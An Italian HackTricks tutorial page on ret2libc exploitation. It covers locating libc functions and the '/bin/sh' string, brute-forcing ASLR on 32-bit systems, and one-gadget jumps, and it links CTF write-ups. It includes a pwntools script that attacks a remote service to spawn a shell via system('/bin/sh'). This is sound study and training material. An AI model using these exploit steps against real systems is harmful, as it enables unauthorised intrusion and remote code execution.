# Ret2lib

{% hint style="success" %}
Impara e pratica l'Hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informazioni di Base**

L'essenza di **Ret2Libc** √® quella di reindirizzare il flusso di esecuzione di un programma vulnerabile verso una funzione all'interno di una libreria condivisa (ad esempio, **system**, **execve**, **strcpy**) anzich√© eseguire shellcode fornito dall'attaccante nello stack. L'attaccante crea un payload che modifica l'indirizzo di ritorno nello stack per puntare alla funzione della libreria desiderata, predisponendo anche eventuali argomenti necessari in base alla convenzione di chiamata.

### **Passaggi di Esempio (semplificati)**

* Ottenere l'indirizzo della funzione da chiamare (ad esempio, system) e il comando da chiamare (ad esempio, /bin/sh)
* Generare una catena ROP per passare il primo argomento puntando alla stringa del comando e il flusso di esecuzione alla funzione

## Trovare gli indirizzi

* Supponendo che la `libc` utilizzata sia quella della macchina corrente, √® possibile trovare dove verr√† caricata in memoria con:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se vuoi verificare se l'ASLR sta cambiando l'indirizzo di libc, puoi fare:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sapendo quale libc viene utilizzato, √® anche possibile trovare l'offset della funzione `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sapendo quale libc viene utilizzato, √® anche possibile trovare l'offset alla stringa della funzione `/bin/sh` con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Conoscendo la libc utilizzata, √® anche possibile utilizzare Peda o GEF per ottenere l'indirizzo della funzione **system**, della funzione **exit** e della stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Utilizzo di /proc/\<PID>/maps

Se il processo crea **figli** ogni volta che si comunica con esso (server di rete) prova a **leggere** quel file (probabilmente avrai bisogno dei privilegi di root).

Qui puoi trovare **esattamente dove √® caricata la libc** all'interno del processo e **dove verr√† caricata** per ogni figlio del processo.

![](<../../../.gitbook/assets/image (853).png>)

In questo caso √® caricata in **0xb75dc000** (Questo sar√† l'indirizzo di base della libc)

## Libreria libc sconosciuta

Potrebbe essere possibile che **non conosci la libc che il binario sta caricando** (perch√© potrebbe trovarsi in un server a cui non hai accesso). In tal caso potresti sfruttare la vulnerabilit√† per **rilevare alcuni indirizzi e trovare quale libreria libc** viene utilizzata:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E puoi trovare un modello di pwntools per questo in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conoscere la libc con 2 offset

Controlla la pagina [https://libc.blukat.me/](https://libc.blukat.me/) e utilizza un **paio di indirizzi** di funzioni all'interno della libc per scoprire la **versione utilizzata**.

## Bypassare l'ASLR in 32 bit

Questi attacchi di forza bruta sono **utili solo per sistemi a 32 bit**.

* Se l'exploit √® locale, puoi provare a forzare l'indirizzo di base della libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se si attacca un server remoto, potresti provare a **forzare l'indirizzo della funzione `usleep` della `libc`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

## One Gadget

Esegui una shell saltando semplicemente a **un** specifico **indirizzo** nella `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Esempio di Codice x86 Ret2lib

In questo esempio, la forzatura dell'ASLR √® integrata nel codice e il binario vulnerabile √® situato in un server remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Esempio di codice x64 Ret2lib

Controlla l'esempio da:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Esempio di ARM64 Ret2lib

Nel caso di ARM64, l'istruzione ret salta dove punta il registro x30 e non dove punta il registro dello stack. Quindi √® un po' pi√π complicato.

Inoltre, in ARM64 un'istruzione fa ci√≤ che l'istruzione fa (non √® possibile saltare nel mezzo delle istruzioni e trasformarle in nuove).

Controlla l'esempio da:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (o puts)

Questo permette di **rivelare informazioni dal processo** chiamando `printf`/`puts` con alcuni dati specifici posti come argomento. Ad esempio, mettendo l'indirizzo di `puts` nella GOT in una chiamata a `puts` si **rivelerebbe l'indirizzo di `puts` in memoria**.

## Ret2printf

Questo significa fondamentalmente abusare di un **Ret2lib per trasformarlo in una vulnerabilit√† di stringhe di formato di `printf`** utilizzando il `ret2lib` per chiamare printf con i valori da sfruttare (sembra inutile ma √® possibile):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Altri Esempi e riferimenti

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dato un leak all'indirizzo di una funzione in libc, utilizzando un gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR abilitato ma nessun PIE, il primo passo √® riempire un overflow fino al byte 0x00 del canary per poi chiamare puts e rivelarlo. Con il canary viene creato un ROP gadget per chiamare puts e rivelare l'indirizzo di puts dalla GOT e un ROP gadget per chiamare `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR abilitato, nessun canary, stack overflow in main da una funzione figlio. ROP gadget per chiamare puts e rivelare l'indirizzo di puts dalla GOT e poi chiamare un one gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, nessun pie, nessun canary, nessun relro, nx. Utilizza la funzione write per rivelare l'indirizzo di write (libc) e chiama un one gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Utilizza una stringa di formato per rivelare il canary dallo stack e un buffer overflow per chiamare system (√® nella GOT) con l'indirizzo di `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, nessun relro, nessun canary, nx, pie. Abusa di un cattivo indicizzazione per rivelare gli indirizzi di libc e heap dallo stack. Abusa del buffer overflow per fare un ret2lib chiamando `system('/bin/sh')` (√® necessario l'indirizzo dell'heap per eludere un controllo).
